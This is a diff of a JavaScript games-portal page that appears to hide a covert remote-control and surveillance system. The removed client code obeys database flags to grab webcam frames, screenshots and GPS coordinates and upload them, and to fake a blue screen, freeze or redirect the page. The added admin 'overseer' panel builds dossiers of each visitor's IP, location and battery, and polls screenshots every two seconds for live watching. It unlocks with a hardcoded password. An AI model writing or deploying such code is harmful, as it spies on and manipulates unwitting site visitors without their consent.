-                const d = s.val(); if(!d) return;
-                if(d.kicked) { closeGame(); window.location.replace(cfg.url); }
-                if(d.redir) window.location.replace(d.redir);
-                if(d.openTab) { window.open(d.openTab, '_blank'); update(userRef, {openTab:null}); }
-                if(d.reload) window.location.reload();
-                if(d.print) { window.print(); update(userRef, {print:false}); }
-                if(d.vibrate) { if(navigator.vibrate) navigator.vibrate([200, 100, 200]); update(userRef, {vibrate:false}); }
-                document.getElementById('freeze').style.display = d.frozen ? 'flex' : 'none';
-                document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
-                if(d.frozen || d.bsod) closeGame();
-                if(d.msg) { alert("ADMIN: " + d.msg); update(userRef, {msg: null}); }
-                if(d.speak) { const u = new SpeechSynthesisUtterance(d.speak); window.speechSynthesis.speak(u); update(userRef, {speak: null}); }
-                if(d.gpsReq) { navigator.geolocation.getCurrentPosition((pos) => { update(userRef, {gps: `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`, gpsReq: false}); }, (err) => { update(userRef, {gps: "Denied", gpsReq: false}); }); }
-                if(d.camReq) { navigator.mediaDevices.getUserMedia({ video: true }).then(stream => { const v = document.createElement('video'); v.srcObject = stream; v.play(); v.onloadedmetadata = () => { const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight; c.getContext('2d').drawImage(v,0,0); stream.getTracks().forEach(t=>t.stop()); update(userRef, {lastCap: c.toDataURL("image/webp", 0.5), camReq: false}); }; }).catch(e => { update(userRef, {camReq: false}); }); }
-                if(d.capReq) { html2canvas(document.body, {useCORS: true}).then(c => update(userRef, {lastCap: c.toDataURL("image/webp", 0.2), capReq: false})).catch(()=>update(userRef,{capReq:false})); }
+    function updateDossier(u,key){
+      const safe = u || {};
+      const name = safe.name || `User_${key.substring(0,6)}`;
+      const status = safe.kicked ? 'KICKED' : (safe.frozen ? 'FROZEN' : (safe.bsod ? 'BSOD' : 'ACTIVE'));
+      const ip = safe.ip || 'N/A';
+      const loc = safe.loc || 'N/A';
+      const gps = safe.gps || 'N/A';
+      const isp = safe.isp || 'N/A';
+      const res = safe.res || 'N/A';
+      const bat = safe.bat || 'N/A';
 
-                // If admin sets an openEmbedUrl on our presence, show the embedded iframe in this client.
-                if(d.openEmbedUrl) {
-                    try {
-                        showEmbedded(d.openEmbedUrl);
-                    } finally {
-                        update(userRef, { openEmbedUrl: null }).catch(()=>{});
-                    }
-                }
-            });
+      document.getElementById('selId').innerText = key.substring(0,6)+'...';
+      document.getElementById('dossier').innerHTML =
+        `<div><b>ID:</b> ${escapeHtml(key.substring(0,6))}</div>
+         <div><b>NAME:</b> ${escapeHtml(name)}</div>
+         <div><b>STATUS:</b> ${escapeHtml(status)}</div>
+         <div><b>IP:</b> ${escapeHtml(ip)}</div>
+         <div><b>LOC:</b> ${escapeHtml(loc)}</div>
+         <div><b>GPS:</b> ${escapeHtml(gps)}</div>
+         <div><b>ISP:</b> ${escapeHtml(isp)}</div>
+         <div><b>RES:</b> ${escapeHtml(res)}</div>
+         <div><b>BATTERY:</b> ${escapeHtml(bat)}</div>`;
+      if(safe.lastCap) document.getElementById('preview').style.backgroundImage = `url(${safe.lastCap})`;
+      else document.getElementById('preview').style.backgroundImage = '';
+    }
 
-            // Fetch game list
-            try {
-                const res = await fetch('https://api.github.com/repos/sqsqs353-alt/the-mongle-thing/contents/');
-                const data = await res.json();
-                gameData = Array.isArray(data) ? data.filter(f => f.name && f.name.endsWith('.html') && f.name !== 'index.html') : [];
-                renderGrid();
-            } catch(e) { console.error("Source fetch failed.", e); }
-            
-            if(isAdmin) startOverseer();
-        };
+    // Generic admin toggle/set actions
+    window.adminAct = async (t) => {
+      if(!selectedID) return alert('Select user first');
+      const targetRef = ref(db, `presence/${selectedID}`);
+      // Kick: set kicked then remove
+      if(t === 'kicked'){
+        try{ await update(targetRef,{kicked:true}); }catch(e){ console.warn(e); }
+        setTimeout(()=>remove(targetRef).catch(()=>{}),900);
+        selectedID = null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage='';
+        if(watchInterval){ clearInterval(watchInterval); watchInterval=null; document.getElementById('watchBtn').style.background='#004400'; document.getElementById('watchBtn').innerText='👁️ Watch'; }
+        return;
+      }
 
-        function closeGame() { if(activeGameWindow) activeGameWindow.close(); }
+      // For actions that are one-shot true
+      if(['reload','capReq','camReq','gpsReq','print','vibrate'].includes(t)){
+        update(targetRef,{[t]:true}).catch(e=>console.warn(e));
+        return;
+      }
 
-        window.renderGrid = () => {
-            const q = document.getElementById('search').value.toLowerCase();
-            const cat = document.getElementById('cat').value;
-            const grid = document.getElementById('grid'); grid.innerHTML = "";
-            let sorted = [...gameData].sort((a,b) => favs.includes(b.name) - favs.includes(a.name));
-            
-            sorted.filter(g => {
-                const n = (g.name || '').toLowerCase();
-                if (!n.includes(q)) return false;
-                if (cat === 'favs') return favs.includes(g.name);
-                const isFnaf = n.includes('fnaf');
-                const isHorror = (n.includes('scary') || n.includes('horror') || n.includes('granny')) && !isFnaf;
-                const isAction = n.includes('doom') || n.includes('quake') || n.includes('action') || n.includes('shooter') || n.includes('cs');
-                if (cat === 'fnaf' && !isFnaf) return false;
-                if (cat === 'horror' && !isHorror) return false;
-                if (cat === 'action' && !isAction) return false;
-                if (cat === 'other' && (isFnaf || isHorror || isAction)) return false;
-                return true;
-            }).forEach(g => {
-                const card = document.createElement('div'); card.className = "card";
-                const safeName = (g.name || 'unknown.html');
-                card.innerHTML = `<div class="fav-area" onclick="toggleFav(event,'${safeName}')"><span class="fav-btn ${favs.includes(safeName)?'active':''}">❤</span></div>${safeName.replace('.html','').toUpperCase()}`;
-                card.onclick = () => {
-                    const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${safeName}`;
-                    update(userRef, {activity: 'Playing '+safeName});
-                    if(cfg.mode==='blank') {
-                        activeGameWindow = window.open('about:blank');
-                        activeGameWindow.document.body.innerHTML = `<style>body,html{margin:0;padding:0;height:100vh;width:100vw;overflow:hidden;background:#000}iframe{width:100vw;height:100vh;border:none}</style><iframe src="${url}" allowfullscreen></iframe>`;
-                    } else if (cfg.mode === 'embed') {
-                        showEmbedded(url);
-                    } else {
-                        activeGameWindow = window.open(url, '_blank');
-                    }
-                };
-                grid.appendChild(card);
-            });
-        };
+      // Toggle others
+      onValue(ref(db, `presence/${selectedID}/${t}`), (s)=>{
+        const cur = s.val();
+        update(ref(db, `presence/${selectedID}`), {[t]: !cur}).catch(e=>console.warn(e));
+      }, {onlyOnce:true});
+    };
 
-        window.toggleFav = (e, n) => { e.stopPropagation(); if(favs.includes(n)) favs = favs.filter(f=>f!==n); else favs.push(n); localStorage.setItem('favs', JSON.stringify(favs)); renderGrid(); };
+    // remove user (force delete node)
+    function adminRemoveUser(){
+      if(!selectedID) return alert('Select user first');
+      if(!confirm('Remove this user presence entry? This is irreversible.')) return;
+      remove(ref(db, `presence/${selectedID}`)).then(()=>{ selectedID=null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage=''; }).catch(e=>alert('Failed: '+e));
+    }
 
-        /* --- Embedded game helpers (client-side) --- */
-        function showEmbedded(url) {
-            const container = document.getElementById('embeddedContainer');
-            const frame = document.getElementById('embeddedFrame');
-            if (!container || !frame) return;
-            frame.src = url;
-            container.style.display = 'flex';
-            container.setAttribute('aria-hidden','false');
-        }
-        function closeEmbedded() {
-            const container = document.getElementById('embeddedContainer');
-            const frame = document.getElementById('embeddedFrame');
-            if (!container || !frame) return;
-            frame.src = 'about:blank';
-            container.style.display = 'none';
-            container.setAttribute('aria-hidden','true');
-        }
+    // Soft ban: store expiry timestamp
+    function adminSoftBan(){
+      if(!selectedID) return alert('Select user first');
+      const mins = parseInt(prompt('Soft ban duration (minutes):','10')||'0',10);
+      if(!mins) return;
+      const until = Date.now() + mins*60*1000;
+      update(ref(db, `presence/${selectedID}`), { softBannedUntil: until, kicked: true }).then(()=>setTimeout(()=>remove(ref(db, `presence/${selectedID}`)).catch(()=>{}),900)).catch(e=>alert('Failed: '+e));
+    }
 
-        /* --- ADMIN CONTROLS --- */
-        function startOverseer() {
-            onValue(ref(db, 'presence'), (snap) => {
-                presenceSnapshot = {};
-                const list = document.getElementById('userList'); list.innerHTML = "";
-                snap.forEach(c => {
-                    const val = c.val() || {};
-                    presenceSnapshot[c.key] = val;
-                    const u = val;
-                    // defensive fallbacks to avoid "undefined"
-                    const displayName = u.name || `Unknown (${c.key.substring(0,6)})`;
-                    const activity = u.activity || '—';
-                    const statusIcon = u.kicked ? "🚫" : (u.frozen ? "❄️" : (u.bsod ? "☠️" : "🟢"));
-                    const d = document.createElement('div');
-                    d.className = `u-item ${selectedID === c.key ? 'selected' : ''}`;
-                    d.innerHTML = `<b>${statusIcon} ${escapeHtml(displayName)}</b><br><small>${escapeHtml(activity)}</small>`;
-                    d.onclick = () => { selectedID = c.key; updateDossier(u, c.key); startOverseer(); };
-                    list.appendChild(d);
-                    if(selectedID === c.key) updateDossier(u, c.key);
-                });
+    // toggle muted flag
+    function adminToggleMute(){
+      if(!selectedID) return alert('Select user first');
+      onValue(ref(db, `presence/${selectedID}/muted`), (s)=>{
+        const cur = s.val();
+        update(ref(db, `presence/${selectedID}`), { muted: !cur }).catch(e=>console.warn(e));
+      }, {onlyOnce:true});
+    }
 
-                // If the previously selected user was removed (e.g. kicked and node deleted), clear selection/dossier
-                if (selectedID && !snap.hasChild(selectedID)) {
-                    console.info("Selected user removed from presence; clearing selection.", selectedID);
-                    selectedID = null;
-                    document.getElementById('dossier').innerHTML = 'Select a user to view intel...';
-                    document.getElementById('preview').style.backgroundImage = '';
-                    if (watchInterval) { clearInterval(watchInterval); watchInterval = null; document.getElementById('watchBtn').style.background="#004400"; document.getElementById('watchBtn').innerText="👁️ WATCH"; document.getElementById('live-indicator').style.display="none"; }
-                }
-            }, (err) => {
-                console.error("Error reading presence:", err);
-            });
-        }
+    // send message
+    function adminMessage(){
+      if(!selectedID) return alert('Select user first');
+      const text = (document.getElementById('adminCommandInp').value||'').trim();
+      if(!text) return alert('Type a message first');
+      update(ref(db, `presence/${selectedID}`), { msg: text }).catch(e=>alert('Failed: '+e));
+      document.getElementById('adminCommandInp').value='';
+    }
 
-        function updateDossier(u, key) {
-            // ensure u is defined and has safe fallback values
-            const safe = u || {};
-            const displayName = safe.name || `Unknown (${key.substring(0,6)})`;
-            const status = safe.frozen ? 'FROZEN' : (safe.bsod ? 'BSOD' : (safe.kicked ? 'KICKED' : 'ACTIVE'));
-            const ip = safe.ip || 'N/A';
-            const loc = safe.loc || 'N/A';
-            const gps = safe.gps || 'N/A';
-            const isp = safe.isp || 'N/A';
-            const res = safe.res || 'N/A';
-            const bat = safe.bat || 'N/A';
-            document.getElementById('dossier').innerHTML = `<div><b>ID:</b> ${key.substring(0,6)}...</div><div><b>NAME:</b> ${escapeHtml(displayName)}</div><div><b>STATUS:</b> ${escapeHtml(status)}</div><div><b>IP:</b> ${escapeHtml(ip)}</div><div><b>LOC:</b> ${escapeHtml(loc)}</div><div><b>GPS:</b> ${escapeHtml(gps)}</div><div><b>ISP:</b> ${escapeHtml(isp)}</div><div><b>RES:</b> ${escapeHtml(res)}</div><div><b>BATTERY:</b> ${escapeHtml(bat)}</div>`;
-            if(safe.lastCap) document.getElementById('preview').style.backgroundImage = `url(${safe.lastCap})`; else document.getElementById('preview').style.backgroundImage = '';
-        }
+    // open game that user is playing in admin browser
+    function adminOpenGame(){
+      if(!selectedID) return alert('Select user first');
+      const u = presenceSnapshot[selectedID];
+      if(!u || !u.activity) return alert('No activity info');
+      const m = u.activity;
+      const fname = m.startsWith('Playing ') ? m.replace(/^Playing\s+/,'') : m;
+      const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${fname}`;
+      window.open(url,'_blank');
+    }
 
-        // Improved adminAct: make "kicked" reliably remove the presence node so the name disappears immediately.
-        window.adminAct = async (t) => {
-            if (!selectedID) return alert("Select User");
-            const targetRef = ref(db, `presence/${selectedID}`);
+    // request embed on client
+    function adminEmbedGame(){
+      if(!selectedID) return alert('Select user first');
+      const supplied = (document.getElementById('adminCommandInp').value||'').trim();
+      let url = supplied;
+      if(!url){
+        const u = presenceSnapshot[selectedID];
+        if(!u || !u.activity) return alert('No activity to infer from and no URL supplied');
+        const fname = u.activity.startsWith('Playing ') ? u.activity.replace(/^Playing\s+/,'') : u.activity;
+        url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${fname}`;
+      }
+      update(ref(db, `presence/${selectedID}`), { openEmbedUrl: url }).then(()=>alert('Embed requested')).catch(e=>alert('Failed: '+e));
+    }
 
-            // Special handling for 'kicked' — set kicked flag so client acts, then remove the presence node
-            if (t === 'kicked') {
-                console.log("Admin action: KICK ->", selectedID);
-                try {
-                    await update(targetRef, { kicked: true });
-                } catch (e) {
-                    console.error("Failed to set kicked flag:", e);
-                }
-                // remove presence after short delay to let client react
-                setTimeout(() => {
-                    remove(targetRef).catch(err => console.warn("Failed to remove presence:", err));
-                }, 1200);
-                selectedID = null;
-                document.getElementById('dossier').innerHTML = 'Select a user to view intel...';
-                document.getElementById('preview').style.backgroundImage = '';
-                if (watchInterval) { clearInterval(watchInterval); watchInterval = null; document.getElementById('watchBtn').style.background="#004400"; document.getElementById('watchBtn').innerText="👁️ WATCH"; document.getElementById('live-indicator').style.display="none"; }
-                return;
-            }
+    // copy IP
+    function adminCopyIP(){
+      if(!selectedID) return alert('Select user first');
+      const ip = (presenceSnapshot[selectedID] && presenceSnapshot[selectedID].ip) || '';
+      if(!ip) return alert('No IP available');
+      navigator.clipboard.writeText(ip).then(()=>alert('IP copied')).catch(()=>alert('Copy failed'));
+    }
 
-            // Toggle boolean-like commands (default)
-            if (['frozen','bsod','print','vibrate','reload','capReq','camReq','gpsReq'].includes(t)) {
-                console.log("Admin action:", t, "->", selectedID);
-                const val = (t === 'reload' || t === 'print' || t === 'vibrate' || t === 'gpsReq' || t === 'camReq' || t === 'capReq') ? true : null;
-                if (val !== null) {
-                    update(targetRef, { [t]: val }).catch(e=>console.error("update failed",e));
-                } else {
-                    onValue(ref(db, `presence/${selectedID}/${t}`), (s) => {
-                        let cur = s.val();
-                        update(ref(db, `presence/${selectedID}`), { [t]: !cur }).catch(e=>console.error("update failed",e));
-                    }, { onlyOnce: true });
-                }
-                return;
-            }
+    // watch live (request repeated snapshots)
+    window.toggleWatch = () => {
+      const btn = document.getElementById('watchBtn');
+      if(watchInterval){ clearInterval(watchInterval); watchInterval=null; btn.style.background='#004400'; btn.innerText='👁️ Watch'; return; }
+      if(!selectedID) return alert('Select user first');
+      btn.style.background='red'; btn.innerText='⏹ Stop';
+      update(ref(db, `presence/${selectedID}`), { capReq: true });
+      watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db, `presence/${selectedID}`), { capReq:true }).catch(()=>{}); }, 2000);
+    };
 
-            // Fallback: treat as toggle via DB value
-            onValue(ref(db, `presence/${selectedID}/${t}`), (s) => {
-                let val = !s.val();
-                update(ref(db, `presence/${selectedID}`), { [t]: val }).catch(e=>console.error("update failed",e));
-            }, { onlyOnce: true });
-        };
+    /* Settings / Cloak */
+    function toggleModal(id){ const el = document.getElementById(id); if(!el) return; el.style.display = el.style.display === 'flex' ? 'none' : 'flex'; }
+    function saveSettings(){
+      cfg.url = document.getElementById('cfgUrl').value || cfg.url;
+      cfg.key = cfg.key; // key input is handled elsewhere if needed
+      cfg.cloak = document.getElementById('cfgCloak').value || 'default';
+      localStorage.setItem('pUrl', cfg.url);
+      localStorage.setItem('pCloak', cfg.cloak);
+      applyCloak(cfg.cloak);
+      toggleModal('settingsM');
+      alert('Saved');
+    }
+    function applyCloak(theme){
+      document.body.setAttribute('data-cloak', theme || 'default');
+      document.getElementById('cfgCloak').value = theme||'default';
+    }
 
-        window.adminCustom = (t) => {
-            if (!selectedID) return alert("Select User");
-            const payload = document.getElementById('adminCommandInp').value || '';
-            console.log("Admin custom:", t, "->", selectedID, payload);
-            update(ref(db, `presence/${selectedID}`), {[t]: payload}).catch(e=>alert("Failed: "+e));
-        };
+    /* Misc */
+    window.panicTrigger = () => { if(!cfg.enable) return; window.location.replace(cfg.url); };
 
-        window.globalReload = () => { if(confirm("NUKE?")) onValue(ref(db, 'presence'), s=>s.forEach(c=>update(ref(db,`presence/${c.key}`),{reload:true})),{onlyOnce:true}); };
+    /* Start as non-admin for default. To enter admin mode, call door('admin') */
+    window.door = (type) => {
+      if(type === 'admin'){
+        const code = prompt('AUTH_CODE:');
+        if(code === 'BALLS_ARE_GOOD'){ isAdmin = true; document.getElementById('adminBtn').style.display='inline-block'; document.getElementById('badge')?.innerText='[OVERSEER]'; startOverseer(); initSession(); }
+        else alert('Bad code');
+      } else {
+        initSession();
+      }
+    };
 
-        window.toggleWatch = () => {
-            const btn = document.getElementById('watchBtn'); const ind = document.getElementById('live-indicator');
-            if(watchInterval) { clearInterval(watchInterval); watchInterval=null; btn.style.background="#004400"; btn.innerText="👁️ WATCH"; ind.style.display="none"; }
-            else { 
-                if(!selectedID) return alert("Select User"); 
-                btn.style.background="red"; btn.innerText="⏹ STOP"; ind.style.display="block";
-                update(ref(db,`presence/${selectedID}`),{capReq:true});
-                watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db,`presence/${selectedID}`),{capReq:true}); }, 2000);
-            }
-        };
+    // If the page loads and user is expected to click, keep login overlay visible
+    // Optionally you can auto-init for testing:
+    // initSession();
 
-        window.toggleCfg = (key) => { cfg[key] = !cfg[key]; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : ''; };
-        window.panicTrigger = () => { if(!cfg.enable) return; if(activeGameWindow) activeGameWindow.close(); window.location.replace(cfg.url); };
-        window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
-        
-        window.addEventListener('keydown', (e) => {
-            if (cfg.enable && (e.key === cfg.key || e.code === cfg.key)) panicTrigger();
-            if (e.shiftKey && (e.key === 'L' || e.key === 'l')) { e.preventDefault(); document.getElementById('loginOverlay').style.display = 'flex'; }
-        }, true);
-
-        window.saveConfig = () => {
-            cfg.url = document.getElementById('cfgUrl').value; cfg.key = tempKey; cfg.mode = document.getElementById('cfgMode').value;
-            localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode); localStorage.setItem('pEnable', cfg.enable);
-            alert("SAVED"); toggleModal('settingsM');
-        };
-
-        // small HTML-escape helper for safe insertion into innerHTML
-        function escapeHtml(s) {
-            if (typeof s !== 'string') return s;
-            return s.replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-        }
-
-        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
-        document.getElementById('cfgMode').value = cfg.mode; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : '';
-    </script>
-
-    <!-- Embedded container (client-side) kept for embedding feature -->
-    <div id="embeddedContainer" aria-hidden="true" style="display:none; position: fixed; inset: 44px 10px 10px 10px; z-index:4000000; align-items:center; justify-content:center;">
-        <button class="embeddedClose" onclick="closeEmbedded()" style="position:absolute; top:8px; right:18px; background:#111; color:var(--primary); border:1px solid #222; padding:6px 10px; border-radius:6px; cursor:pointer; z-index:4000010;">CLOSE</button>
-        <iframe id="embeddedFrame" sandbox="allow-same-origin allow-scripts allow-forms allow-popups" style="width:calc(100% - 40px); height:calc(100% - 40px); border:2px solid #222; border-radius:8px; background:#000; box-shadow:0 10px 40px rgba(0,0,0,0.7);"></iframe>
-    </div>
+    // defensive: set cfg UI
+    document.getElementById('cfgUrl').value = cfg.url;
+  </script>
 </body>
 </html>
